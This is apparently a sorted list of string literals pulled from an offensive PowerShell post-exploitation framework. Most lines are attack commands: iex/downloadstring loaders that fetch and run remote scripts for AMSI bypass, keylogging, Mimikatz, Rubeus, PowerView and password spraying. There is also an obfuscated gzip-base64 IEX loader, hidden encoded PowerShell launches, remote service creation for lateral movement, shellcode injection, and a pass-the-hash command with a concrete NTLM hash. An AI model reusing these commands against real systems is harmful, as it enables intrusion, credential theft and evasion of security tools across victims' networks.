"""[+] New session established [$computerNameOnly]"
"""[+] Output saved to $fileName"
"""[+] Output saved to: $PWD\LocalAdminAccess.txt"
"""[+] Output saved to: c:\Users\Public\Documents\LocalAdminAccess.txt"
"""[+] Processes sorted by PID:"
"""[+] Processes sorted by ProcessName:"
"""[+] Processes sorted by Username:"
"""[+] RDP Keylog saved to $fileName"
"""[+] RDP Keylogger Loaded | Saving to c:\Users\Public\Documents | https://github.com/nocerainfosec/TakeMyRDP2.0"
"""[+] RDP Keylogger started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]"
"""[+] Resolving Foreign Addresses"
"""[+] Resynchronized with stream."
"""[+] SMBRemoting and WMIRemoting Loaded | https://github.com/Leo4j/Invoke-SMBRemoting | https://github.com/Leo4j/Invoke-WMIRemoting"
"""[+] Screenshot location: $fileName"
"""[+] Shellcode (hex):"
"""[+] Shortcuts:"
"""[+] TGT_Monitor started with PID $($processId.Trim()). To kill it [Stop-Process -Id $($processId.Trim())]"
"""[+] TLS Enabled"
"""[+] The current user has Local Admin access on:"
"""[+] Token-Impersonation Loaded | https://github.com/Leo4j/Token-Impersonation"
"""[+] Usage:"
"""[+] Validate Domain Credentials | https://github.com/Leo4j/Validate-Credentials"
"""[-] Access Denied"
"""[-] Empty Clipboard"
"""[-] Empty Keylog"
"""[-] Empty RDP Keylog"
"""[-] Error retrieving History for user $userDir"
"""[-] Error retrieving screenshot"
"""[-] Failed on $($result.Computer): $($result.Message)"
"""[-] Injection Failed. Did you load the module ? [PInject]"
"""[-] No Access"
"""[-] No connection was established. Returning to previous menu..."
"""[-] Please provide your host IP address: -IP <YOUR-IP>"
"""[-] The file specified does not exist."
"""[Convert]::ToBase64String([System.IO.File]::ReadAllBytes('$historyFile'))"
"""[Convert]::ToBase64String([System.IO.File]::ReadAllBytes(`"
"""[IO.File]::WriteAllBytes('$UserPath\$remoteFileName', [Convert]::FromBase64String('$fileContentBase64'))"
"""[{0}]"
"""\."
"""\\"
"""\\$ComputerName create $ServiceName binpath= `"
"""\\$ComputerName delete $ServiceName"
"""\\$ComputerName start $ServiceName"
"""\\$ComputerName\ROOT\CIMV2:$ClassID"
"""\\$ComputerName\root\cimv2"
"""\\$Target create $ServiceName binpath= `"
"""\\$Target start $ServiceName"
"""\\$TargetServer delete $serviceToDelete"
"""\\`$TargetServer delete `$serviceToDelete"
"""\s+"
"""\s+\d+\.\d+\.\d+\.\d+:\d+\s+"
"""\x00`"
"""^172\.(1[6-9]|2[0-9]|3[0-1])\."
"""^\[!\] Process running with"
"""^\[\+] Sucessfully injected the shellcode into"
"""_"
"""__CLASS"
"""`"
"""`$Find = @();`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find"
"""`$Find = @();`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find"
"""`$Find = @();`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find"
"""`$Find = @();`$Find = Access_Check -Method PSRemoting -Domain $userdefdomain;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find"
"""`$Find = @();`$Find = Access_Check -Method PSRemoting -Targets $userdeftargets;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find"
"""`$Find = @();`$Find = Access_Check -Method PSRemoting;`$computersLine =@();`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };`$Find"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -Targets $userdeftargets;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -DomainController $userdefdc;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -Targets $userdeftargets;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Domain $userdefdomain;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Targets $userdeftargets -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -Targets $userdeftargets;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting -UserName $userdefusername -Password $userdefpassword;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;`$SecPassword = ConvertTo-SecureString $userdefpassword -AsPlainText -Force;`$cred = New-Object System.Management.Automation.PSCredential($userdefusername,`$SecPassword);Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob -Credential `$cred > `$null}else{Write-Output '[-] No Access'}#"
"""`$Find = Find-LocalAdminAccess -Method PSRemoting;`$computersLine = `$Find -split [Environment]::NewLine | Where-Object { `$_.contains('.') };if(`$computersLine){`$Find;Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob > `$null}else{Write-Output '[-] No Access'}#"
"""`$ShCodePlaceholder = `"
"""`$c 2>&1|Out-String`"
"""`$command 2>&1 | Out-String"
"""`$env:COMPUTERNAME,`$(Get-Location)"
"""`$gz=`'$gzipcompressedBase64`';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX > `$null`"
"""`$job = Invoke-Command -ComputerName `$computersLine -ScriptBlock {$finalstring} -ErrorAction SilentlyContinue -AsJob"
"""`$job | Wait-Job;`$job | Remove-Job"
"""`$outputData = &$commandStr | Out-String; Get-WmiObject -Class $ClassID -Filter `"
"""`$p=New-Object System.IO.Pipes.NamedPipeClientStream("
"""`$p=New-Object System.IO.Pipes.NamedPipeClientStream('$ComputerName','$PipeName','InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(600000);`$w.WriteLine("
"""`$process = Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ep Bypass', '-enc $encCommand' -PassThru;`$processId = `$process.Id"
"""`$pwd\$remotefileName`"
"""`$sD=New-Object System.IO.Pipes.PipeSecurity;`$sU=New-Object System.Security.Principal.SecurityIdentifier "
"""`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"
"""`$trimmedShCodePlaceholder = `$ShCodePlaceholder.Trim();PInject /t:1 /f:hex /pid:$InjectPID /sc:`$trimmedShCodePlaceholder /enc:AES"
"""`\`"
"""`n"
"""`n$"
"""`nFile-Server -Port $userdefPort -Path $userdefPath"
"""`n`"
"""`r?`n"
"""`r?`n`"
"""ababcdcdefefghgh"
"""c:\Users\Public\Documents\Amnesiac\Clipboard"
"""c:\Users\Public\Documents\Amnesiac\Downloads"
"""c:\Users\Public\Documents\Amnesiac\History"
"""c:\Users\Public\Documents\Amnesiac\Keylogger"
"""c:\Users\Public\Documents\Amnesiac\Monitor_TGTs"
"""c:\Users\Public\Documents\Amnesiac\Screenshots"
"""c:\Users\Public\Documents\Amnesiac\Scripts"
"""c:\Users\Public\Documents\LocalAdminAccess.txt"
"""c:\Users\Public\Documents\`$(`$env:USERNAME)log.txt`"
"""comma_separated_Targets`"
"""create $ServiceName binpath= `"
"""dNSHostName"
"""delete $serviceToDelete"
"""dummyhostdropconnection,`$(Get-Location)`"
"""exit"
"""exit`"
"""ferrari.local`"
"""ferrari\Administrator`"
"""has Local Admin access on"
"""help"
"""history"
"""http://$($DefineHostname):$userdefPort"
"""https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Tools"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ask4Creds.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Ferrari.ps1');Write-Output '';Write-Output '[+] Rubeus Loaded | https://github.com/GhostPack/Rubeus';Write-Output '';Write-Output '[+] Usage: Rubeus <command>';Write-Output '';Write-Output '    Rubeus createnetonly /program:c:\windows\system32\cmd.exe /domain: /dc: /username: /password:fakepass /ptt /ticket:'"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Find-LocalAdminAccess.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-Patamenia.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-SMBRemoting.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-WMIRemoting.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Invoke-SessionHunter.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/NETAMSI.ps1');Write-Output '';Write-Output '[+] .NET Patched'"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PInject.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PInject.ps1');Write-Output '';Write-Output '[+] PInject Loaded | https://github.com/3xpl01tc0d3r/ProcessInjection';Write-Output '';Write-Output '[+] Usage: PInject <pid> <shellcode_in_hex_format>';Write-Output '';Write-Output '[+] Tip: How to generate your hex shell code:';Write-Output '';Write-Output '    ShellGen powershell.exe -ep bypass -WindowS Hidden -enc JABzAGQA.....wBlACgAKQA=';Write-Output '';Write-Output '    msfvenom -p windows/x64/exec CMD=`"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/PassSpray.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1');Write-Output '';Write-Output '[+] Patched'"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/SimpleAMSI.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/klg.ps1');KeyLog -logfile `"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Suntour.ps1');Write-Output '';Write-Output '[+] Mimi Loaded | https://blog.gentilkiwi.com';Write-Output '';Write-Output '[+] Usage: Mimi -Command ''`"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Sync.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/TGT_Monitor.ps1');TGT_Monitor -Clear"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/TGT_Monitor.ps1');TGT_Monitor -EncryptionKey `"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/TGT_Monitor.ps1');TGT_Monitor -Timeout 86400 -EncryptionKey `"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Token-Impersonation.ps1');iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Tkn_Access_Check.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/Validate-Credentials.ps1')"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/cms.ps1');Enum-Creds"
"""iex(new-object net.webclient).downloadstring('$($global:ServerURL)/pwv.ps1');Write-Output '';Write-Output '[+] PowerView Loaded | https://github.com/PowerShellMafia/PowerSploit'"
"""is not running"
"""log.txt"
"""name"
"""nt authority\system"
"""powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand "
"""powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $base64Input"
"""powershell.exe -NoLogo -NonInteractive -ep bypass -Window Hidden -enc $b64ServerScript"
"""powershell.exe -WindowS Hidden -ep Bypass -enc $b64ServerScript"
"""powershell.exe -ep bypass -Window Hidden -enc $b64ServerScript"
"""powershell.exe -ep bypass -WindowS Hidden -enc JABzAGQA.....wBlACgAKQA=`"
"""powershell.exe"
"""prompt | Out-String"
"""root\cimv2"
"""screen4K"
"""screenshot"
"""sekurlsa::pth /user:Administrator /domain:ferrari.local /ntlm:217E50203A5ABA59CEFA863C724BF61B`"
"""shell_psadmin*"
"""shell_smbadmin*"
"""shell_tknadmin*"
"""shell_wmiadmin*"
"""start $ServiceName"
"""sync"
"""trustAttributes"
"""trustDirection"
"""trustPartner"
"""trustType"
"""trustattributes"
"""trustdirection"
"""trusttype"
"""try{type c:\Users\Public\Documents\$ConstructFileName | Out-String -Width 4096}catch{}#"
"""try{type c:\Users\Public\Documents\RDP_log.txt | Out-String -Width 4096}catch{}#"
"""whenChanged"
"""whenCreated"
"""whoami /all`"
"""whoami"
"""|"
"""|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"
"""|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"
"""};Get-Process -IncludeUserName | Where-Object { $_.Id -eq $PID } | Select ID, ProcessName, SessionId, UserName, Path | Sort ID | Format-Table -AutoSize | Out-String -Width 4096}else{Write-Output "
"""};Write-Output "
"""}else{Write-Output "
